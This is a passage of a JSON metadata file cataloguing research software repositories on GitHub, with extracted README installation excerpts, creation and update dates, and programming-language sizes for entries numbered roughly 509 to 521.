                    "size": 20294
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 14616
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 2976
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 1891
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 697
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 510
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "510": {
        "filename": "soarsmu_attack-pretrain-models-of-code_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/soarsmu/attack-pretrain-models-of-code",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "We use `tree-sitter` to parse code snippets and extract variable names. You need to go to `./parser` folder and build tree-sitter using the following commands:\n```\nbash build.sh\n```\n \n",
                    "original_header": "Build `tree-sitter`"
                },
                "confidence": 0.9999998450965513,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/soarsmu/attack-pretrain-models-of-code/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "As a quick comparison, here is the log for `MHM-NS`. Although it successfully attacks as well, it queries the model for much more times and is 5 times slower than our method.\n```\n  >>  iter 1, ACC! extradata_size => extradada_address (0 => 0, 0.59901 => 0.59422) a=1.088\n  >>  iter 2, ACC! vendor =>  voy (0 => 0, 0.59422 => 0.58793) a=1.076\n  >>  iter 3, ACC! extradada_address => extradada_capacity (0 => 0, 0.58793 => 0.58041) a=1.060\n  >>  iter 4, ACC! bitexact => bitextract (0 => 0, 0.58041 => 0.56324) a=1.070\n  >>  iter 5, ACC! oggstream => oggrun (0 => 0, 0.56324 => 0.56430) a=1.029\n  >>  iter 6, ACC! p => tp (0 => 0, 0.56430 => 0.55780) a=1.114\n  >>  iter 7, ACC! bitextract => ittexract (0 => 0, 0.55780 => 0.55839) a=1.010\n  >>  iter 8, ACC! tp => up (0 => 0, 0.55839 => 0.54421) a=1.101\n  >>  iter 9, ACC! ittexract => biteexact (0 => 0, 0.54421 => 0.55088) a=1.024\n  >>  iter 10, ACC!  voy => ivoy (0 => 0, 0.55088 => 0.55088) a=1.000\n  >>  iter 11, ACC! oggrun => ottsystem (0 => 0, 0.55088 => 0.55714) a=1.045\n  >>  iter 12, ACC! ottsystem => otttable (0 => 0, 0.55714 => 0.56155) a=1.053\n  >>  iter 13, ACC! up => point (0 => 0, 0.56155 => 0.59689) a=1.123\n  >>  iter 14, ACC! ivoy => coid (0 => 0, 0.59689 => 0.59689) a=1.000\n  >>  iter 15, ACC! extradada_capacity => extradATA_capacity (0 => 0, 0.59689 => 0.58104) a=1.039\n  >>  iter 16, ACC! otttable => oggfile (0 => 0, 0.58104 => 0.55747) a=1.060\n  >>  iter 17, ACC! coid => vsoice (0 => 0, 0.55747 => 0.55747) a=1.000\n  >>  iter 18, ACC! biteexact => bitepexacting (0 => 0, 0.55747 => 0.55841) a=1.025\n  >>  iter 19, ACC! bitepexacting => ittexacts (0 => 0, 0.55841 => 0.56496) a=1.031\n  >>  iter 20, REJ. extradATA_capacity => extradada_capacity (0 => 0, 0.56496 => 0.57938) a=0.994\n  >>  iter 21, ACC! oggfile => oggcloud (0 => 0, 0.56496 => 0.55694) a=1.018\n  >>  iter 22, REJ. oggcloud => ottchannel (0 => 0, 0.55694 => 0.58494) a=0.991\n  >>  iter 23, ACC! ittexacts => itteXACT (0 => 0, 0.55694 => 0.56409) a=1.043\n  >>  iter 24, REJ. oggcloud => ogform (0 => 0, 0.56409 => 0.58792) a=0.983\n  >>  iter 25, REJ. oggcloud => gowstage (0 => 0, 0.56409 => 0.58440) a=0.982\n  >>  iter 26, SUCC! point => a (0 => 1, 0.56409 => 0.49193) a=1.000\nEXAMPLE 10 SUCCEEDED!\n  time cost = 0.70 min\n  ALL EXAMPLE time cost = 9.78 min\n  curr succ rate = 0.5714285714285714\nQuery times in this attack:  713\nAll Query times:  10114\n```\n \n",
                    "original_header": "Datasets and Results"
                },
                "confidence": 0.999999999994543,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/soarsmu/attack-pretrain-models-of-code/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-07-16T07:55:54Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-10-03T11:46:04Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 878518
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 26541
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "511": {
        "filename": "clowee_MicroserviceDataset_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/clowee/MicroserviceDataset",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "| Project Name                             | Github URL            | Number of microservices | Total Size <br/><sub>(Lines of Code)</sub> | \n|------------------------------------------|-----------------------|:-----------------------:|:----------------:|\n| Microservice Architecture for blog post  | http://bit.ly/2OKY29v | 9                       |         1536     | \n| E-Commerce App                           | http://bit.ly/2yLqTPW | 7                       |          967     | \n| Consul demo                              | http://bit.ly/2KsGzx6 | 5                       |         2343     |\n| EnterprisePlanner                        | http://bit.ly/2ZPK7je | 5                       |         4264     |\n| eShopOnContainers                        | http://bit.ly/2YGSkJB | 25                      |        69874     |\n| FTGO - Restaurant Management             | http://bit.ly/2M7f8fm | 13                      |         9366     |\n| Lakeside Mutual Insurance Company        | http://bit.ly/33iJSiU | 8                       |        19363     |\n| Microservices book                       | http://bit.ly/2TeSbI2 | 6                       |         2417     |\n| spring-cloud-netflix-example             | http://bit.ly/2YOUJxJ | 9                       |          419     |\n| Pitstop - Garage Management System       | http://bit.ly/2Td7NLY | 13                      |        34625     |\n| Robot Shop                               | http://bit.ly/2ZFbHQm | 12                      |         2523     |\n| Share bike (Chinese)                     | http://bit.ly/2YMJgmb | 9                       |          302     |\n| Spring Cloud Microservice Example        | http://bit.ly/2GS2ywt | 10                      |         2333     |\n| Spring PetClinic                         | http://bit.ly/2YMVbAC | 8                       |         2475     |\n| Tap-And-Eat (Spring Cloud)               | http://bit.ly/2yIjXmC | 5                       |         1418     |\n| Vehicle tracking                         | http://bit.ly/31i5aLM | 8                       |         5462     |\n| Lelylan - Open Source Internet of Things | http://bit.ly/2TdDfd3 | 14                      |         7763     |\n| Spinnaker                                | http://bit.ly/2YQA2S7 | 10                      |        33822     |\n| Open-loyalty                             | http://bit.ly/2ZApXtA | 5                       |        16641     |\n| CQRS microservice application            | http://bit.ly/2YtbtiF | 7                       |         1632     |\n \n",
                    "original_header": "List of project analyzed for Microservice Dataset"
                },
                "confidence": 0.9999641140142281,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/clowee/MicroserviceDataset/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-08-19T09:58:40Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-13T14:31:37Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "512": {
        "filename": "kwz219_P-EPR-Artefact_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/kwz219/P-EPR-Artefact",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-03-30T09:04:13Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-12T07:56:03Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 15059170
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 35780
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "513": {
        "filename": "WHU-AISE_PBScaler_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/WHU-AISE/PBScaler",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-03-07T04:38:02Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-21T12:03:02Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 1847467
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 824576
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 629015
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 424366
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Go",
                    "name": "Go",
                    "type": "Programming_language",
                    "size": 92068
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 59116
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 28094
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 25146
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C#",
                    "name": "C#",
                    "type": "Programming_language",
                    "size": 22716
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "FreeMarker",
                    "name": "FreeMarker",
                    "type": "Programming_language",
                    "size": 1055
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 561
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "514": {
        "filename": "cristianassaiante_incomplete-debuginfo_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/cristianassaiante/incomplete-debuginfo",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-11-08T13:23:42Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-04-17T23:10:22Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 93551
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 5528
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Perl",
                    "name": "Perl",
                    "type": "Programming_language",
                    "size": 1288
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "515": {
        "filename": "NAIST-SE_PATSQL_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/NAIST-SE/PATSQL",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Execute the following maven command. This generates `patsql-engine-1.0.0.jar` in the `target` directory. \n\n```\nmvn install -DskipTests\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "PATSQL - SQL Synthesizer"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/NAIST-SE/PATSQL/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- `src`  - source code.\n- `test` - test code.\n- `test/patsql/synth/benchmark/ScytheSqlSynthesizerTest.java` - test code to execute `ase13` benchmark.\n- `test/patsql/synth/benchmark/ScytheTopRatedPostsTest.java` - test code to execute `so-top` benchmark.\n- `test/patsql/synth/benchmark/ScytheDevSetTest.java` - test code to execute `so-dev` benchmark.\n- `test/patsql/synth/benchmark/ScytheRecentPostsTest.java` - test code to execute `so-rec` benchmark.\n- `test/patsql/synth/benchmark/KaggleTest.java` - test code to execute `kaggle` benchmark.\n- `examples` - input and output tables used for test and evaluation.\n- `evaluation` - benchmark results in html. \n \n",
                    "original_header": "Contents"
                },
                "confidence": 0.9267427049798416,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/NAIST-SE/PATSQL/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "See the transitive dependencies from each link below.  \n \n",
                    "original_header": "Third-party libraries used in this project"
                },
                "confidence": 0.9117382247555469,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/NAIST-SE/PATSQL/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Module \"junit-jupiter-api\" of JUnit 5.  \nLicense: EPL 2.0  \nVersion: 5.5.1  \nhttps://mvnrepository.com/artifact/org.junit.jupiter/junit-jupiter-api/5.5.1  \n \n",
                    "original_header": "JUnit Jupiter API"
                },
                "confidence": 0.9991149948891617,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/NAIST-SE/PATSQL/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Module \"junit-jupiter-engine\" of JUnit 5.  \nLicense: EPL 2.0  \nVersion: 5.5.1  \nhttps://mvnrepository.com/artifact/org.junit.jupiter/junit-jupiter-engine/5.5.1  \n \n",
                    "original_header": "JUnit Jupiter Engine"
                },
                "confidence": 0.9975455142165027,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/NAIST-SE/PATSQL/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Used to validate the syntax of synthesized queries in test.  \nLicense: EPL 1.0, MPL 2.0  \nVersion: 1.4.200  \nhttps://mvnrepository.com/artifact/com.h2database/h2/1.4.200  \n \n",
                    "original_header": "H2 Database Engine"
                },
                "confidence": 0.9964433721899372,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/NAIST-SE/PATSQL/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Used to serialize and deserialize Java objects to JSON.  \nLicense: Apache 2.0  \nVersion: 2.8.6  \nhttps://mvnrepository.com/artifact/com.google.code.gson/gson/2.8.6\n \n",
                    "original_header": "Gson"
                },
                "confidence": 0.9992130645927784,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/NAIST-SE/PATSQL/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Used to format SQL queries.  \nLicense: LGPL 2.1  \nVersion: 5.4.11.Final  \nhttps://mvnrepository.com/artifact/org.hibernate/hibernate-core/5.4.11.Final  \n \n",
                    "original_header": "Hibernate Core Relocation"
                },
                "confidence": 0.9970795871807295,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/NAIST-SE/PATSQL/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-10-29T01:50:28Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-07-14T07:55:16Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 566591
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 381328
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 6017
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 2094
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 29
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "516": {
        "filename": "lchen001_HAPI_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/lchen001/HAPI",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "In this section, we discuss how to download the database without the HAPI Python API. \n\nThe database is stored in a GCP bucket named [`hapi-data`](https://console.cloud.google.com/storage/browser/hapi-data). All model predictions are stored in [`hapi.tar.gz`](https://storage.googleapis.com/hapi-data/hapi.tar.gz) (Compressed size: `205.3MB`, Full size: `1.2GB`). \n    \nFrom the command line, you can download and extract the predictions with: \n```bash\n    wget https://storage.googleapis.com/hapi-data/hapi.tar.gz && tar -xzvf hapi.tar.gz \n```\nHowever, we recommend downloading using the Python API as described above. \n\n",
                    "type": "Text_excerpt",
                    "original_header": "\ud83d\udcbe  Manual Downloading"
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/lchen001/HAPI/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<div align=\"center\"><img src=\"https://raw.githubusercontent.com/lchen001/HAPI/main//docs/assets/datasets.b9bdb1e1.png\" height=\"470\" width=\"630\" ></div> \n",
                    "original_header": "\ud83d\udca1 What is HAPI?"
                },
                "confidence": 0.997351767982998,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/lchen001/HAPI/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```bash\npip install \"hapi @ git+https://github.com/lchen001/hapi@main\"\n``` \n\n```python\n>> import hapi\n\n>> hapi.config.data_dir = \"/path/to/data/dir\" \n\n>> hapi.download()\n``` \n> You can permanently set the data directory by adding the variable `HAPI_DATA_DIR` to your environment. \nOnce we've downloaded the database, we can list the available APIs, datasets, and tasks with `hapi.summary()`. This returns a [Pandas DataFrame](https://pandas.pydata.org/pandas-docs/stable/reference/api/pandas.DataFrame.html) with columns `task, dataset, api, date, path, cost_per_10k`. \n```python\n>> df = hapi.summary()\n``` \n",
                    "original_header": "\u26a1\ufe0f Quickstart"
                },
                "confidence": 0.9858908884194899,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/lchen001/HAPI/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "If the dataset is not yet available through the Meerkat Dataset Registry, a `ValueError` will be raised containing instructions for manually downloading the dataset. For example:\n```python\n>> dp = hapi.get_dataset(\"cmd\")\n\nValueError: Data download for 'cmd' not yet available for download through the  HAPI Python API. Please download manually following the instructions below: \n \nCMD is a spoken command recognition dataset. \n\nIt can be downloaded here: https://pyroomacoustics.readthedocs.io/en/pypi-release/pyroomacoustics.datasets.google_speech_commands.html.\n```\n \n",
                    "original_header": "\ud83c\udf0d Datasets"
                },
                "confidence": 0.9999999999976694,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/lchen001/HAPI/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-06-08T19:45:55Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-02-01T05:44:12Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 30876
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 774
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "517": {
        "filename": "MacOS_blockchain-oracles-data-collection_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/MacOS/blockchain-oracles-data-collection",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2020-04-07T20:13:19Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-07-06T20:54:23Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 3553969
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 572159
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 34506
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 6924
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 3464
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Vim Script",
                    "name": "Vim Script",
                    "type": "Programming_language",
                    "size": 247
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 189
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "518": {
        "filename": "sch8906_intAbs_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ChunghaSung/intAbs",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The source code is a modified version from https://github.com/markus-kusano/watts \n",
                    "original_header": "README"
                },
                "confidence": 0.9999231957394418,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/sch8906/intAbs/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The program is an LLVM opt pass. It is built using CMake. \nSince we are using CMake, this likely requires LLVM version 3.6.0 \nModify the CMakeLists file variable APRON_PREFIX to be the location where Apron is installed \nAssuming your LLVM library files are in a standard location (more on this below), simply: \n    mkdir build\n    cd build\n    cmake ../\n    make \nIf you need to tell CMake where LLVM lives, you need to add the option -DLLVM_DIR, e.g., \ncmake -DLLVM_DIR=/home/chungha/src/share/llvm/cmake ../ \nThe directory passed to LLVM_DIR should be the location where the LLVM CMake files are (e.g., LLVM-Config.cmake). \nYou also may need to set -DZ3_INC and -DZ3_LIB to the include directory, and library file for Z3, respectively.\n \n",
                    "original_header": "Building"
                },
                "confidence": 0.9868560177756414,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/sch8906/intAbs/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "You need to modify LLVM path and build path in src/test/export.sh file to test program such as LLVM_PREFIX, WORKLIST_SO, Z3_BIN. \n",
                    "original_header": "Test Path"
                },
                "confidence": 0.9998948050388188,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/sch8906/intAbs/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2017-08-18T00:50:39Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-05-15T14:03:56Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 2297302
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "LLVM",
                    "name": "LLVM",
                    "type": "Programming_language",
                    "size": 525024
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 347396
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 29395
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 12118
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "SMT",
                    "name": "SMT",
                    "type": "Programming_language",
                    "size": 1599
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CMake",
                    "name": "CMake",
                    "type": "Programming_language",
                    "size": 1567
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "519": {
        "filename": "soarsmu_PRTiger_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/soarsmu/PRTiger",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- For fine-tuning BART and T5, please use the script under [`./fine-tuning/run_rummarization.py`](./fine-tuning/run_rummarization.py)\n- Install the `requirements.txt` \n",
                    "original_header": "Fine-tuning BART and T5"
                },
                "confidence": 0.9998680936989403,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/soarsmu/PRTiger/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-06-29T07:28:17Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-08-28T15:06:25Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 355108
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 1158
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "520": {
        "filename": "pooyanjamshidi_ase17_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/pooyanjamshidi/ase17",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2017-08-26T16:35:58Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-01-04T16:16:44Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "MATLAB",
                    "name": "MATLAB",
                    "type": "Programming_language",
                    "size": 206552
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "521": {
        "filename": "program-repair_defects4j-dissection_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/program-repair/defects4j-dissection",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2017-10-05T12:56:26Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-13T11:44:11Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 6874
                },
